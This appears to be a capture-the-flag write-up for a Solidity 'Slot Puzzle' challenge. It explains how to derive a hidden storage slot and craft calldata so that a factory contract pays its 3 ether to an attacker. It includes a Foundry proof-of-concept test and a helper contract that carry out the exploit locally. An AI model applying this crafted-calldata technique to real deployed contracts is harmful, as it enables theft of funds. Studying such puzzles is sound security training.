## Slot Puzzle
To solve the slot puzzle we need to call the `deploy` function from the factory with the right data.

The `deploy` function will create a new SlotPuzzle() and add the address of the deployed contract to `deployedAddress` array and calls the `ascertainSlot` function on the deployed SlotPuzzle().

The `payout` function checks if the caller is in the `deployedAddress` array and that the amount is exatcly 1 ether. The first check will pass, if out created contract can call the `payout` function.

The `ascertainSlot` if called successfully will call the `payout` function in a loop for `params.recipients.length`.

The first two checks in `ascertainSlot` only checks that the `msg.sender` is the factory (as we use the deploy function this is true) and that the `params.recipients.length == params.totalRecipients` match what we just need to prepare right.

`ascertainSlot` is calling the `getSlotValue` that is checking that `bytes32 public immutable ghost` is matching the value load from storage that was saved in the constructor to the variable `ghostInfo`.

To calculate the right storage location where `ghost` was saved to, we need the following variables:
- tx.origin
- block.number
- block.timestamp
- msg.sender
- block.prevrandao
- block.coinbase
- block.chainid
- block.basefee

`msg.sender` is the factory contract, as this address is creating the SlotPuzzle contract and the tx.origin is the EOA who starts the transaction.
All other variables can be looked-up on the block where the contract was created.

To help us get the right storage location, we use a helper contract `AttackHelperSlotPuzzle` that copies the storage layout from SlotPuzzle and saves the same value to storage and give us a option to get the right storage slot that `getSlotValue` needs to load to match the `ghost`.

Now we only need to place the needed storage location on the right place in our call to `payout` that it will be on the following place: `calldataload(add(slotKey,offset))` what is 1e0 = 480 so the calldataload will load after 960 and here we need to place the right value for the storage slot.

In the POC I added some comments how I shifted the values so they are placed at the right location.

## Test
forge test --match-contract=SlotPuzzleTest

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import {SlotPuzzle} from "src/SlotPuzzle.sol";
import {SlotPuzzleFactory} from "src/SlotPuzzleFactory.sol";
import {Parameters,Recipients} from "src/interface/ISlotPuzzleFactory.sol";

contract SlotPuzzleTest is Test {
    SlotPuzzle public slotPuzzle;
    SlotPuzzleFactory public slotPuzzleFactory;
    address hacker;

    function setUp() public {
        slotPuzzleFactory = new SlotPuzzleFactory{value: 3 ether}();
        hacker = makeAddr("hacker");
    }

    function testHack() public {                
        vm.startPrank(hacker,hacker);
        assertEq(address(slotPuzzleFactory).balance, 3 ether, "weth contract should have 3 ether");

        //hack time

        // deploy a helper contract with same storage layout like SlotPuzzle to get the needed storage location
        AttackHelperSlotPuzzle attackStorageHelper = new AttackHelperSlotPuzzle(
            hacker,
            block.number,
            block.timestamp,
            address(slotPuzzleFactory),
            block.prevrandao, 
            block.coinbase,
            block.chainid,
            blockhash(block.number - block.basefee)
        );

        // get the storage slot where the value of ghost was stored on deployment of the SlotPuzzleFactory
        bytes32 storageLocation = attackStorageHelper.ghostSlot();

        // we transfer 3 times ether to us
        Recipients[] memory recipients = new Recipients[](3);        
        recipients[0] = Recipients({
            account: hacker,
            amount: 1 ether
        });
        recipients[1] = Recipients({
            account: hacker,
            amount: 1 ether
        });
        recipients[2] = Recipients({
            account: hacker,
            amount: 1 ether
        });

        // prepare the call
        Parameters memory params = Parameters({
            totalRecipients: 3, // needs to match the length of recipients
            offset: 0x84, // calldataload(132) = 0000000000000000000000000000000000000000000000000000000000000160
            recipients: recipients, // the ether transfers in ascertainSlot
            slotKey: abi.encode( // we need to prepare a bytes with length of 96
                0, // first 32 bytes we don't need, just fill with zeros, but can be anything
                storageLocation >> 224, // for the next 32 bytes, we need the first 4 bytes of our storageLocation in the end
                storageLocation << 32   // for the last 32 bytes, we need the storageLocation - the first 4 bytes we already have
                // we have now placed the storage location on the right place for the calldataload()
            )
        });

        slotPuzzleFactory.deploy(params);


        assertEq(address(slotPuzzleFactory).balance, 0, "weth contract should have 0 ether");
        assertEq(address(hacker).balance, 3 ether, "hacker should have 3 ether");

        
        vm.stopPrank();
    }
}

contract AttackHelperSlotPuzzle {
    bytes32 public immutable ghost = 0x68747470733a2f2f6769746875622e636f6d2f61726176696e64686b6d000000;    
    ISlotPuzzleFactory public factory;

    struct ghostStore {
        bytes32[] hash;
        mapping (uint256 => mapping (address => ghostStore)) map;
    }

    mapping(address => mapping (uint256 => ghostStore)) private ghostInfo;

    bytes32 public ghostSlot;

    constructor(address origin, uint256 blockNumber, uint256 timeStamp, address sender, uint256 prevran, address coinbase, uint256 chainid, bytes32 blockHash) {

        bytes32[] storage helper = ghostInfo[origin][blockNumber]
        .map[timeStamp][sender]
        .map[prevran][coinbase]
        .map[chainid][address(uint160(uint256(blockHash)))]
        .hash;

        bytes32 bytes32Help;
        assembly {
            mstore (0, helper.slot)
            bytes32Help := add (keccak256 (0, 32), 0)
        }

        ghostSlot = bytes32Help;
    }
}
```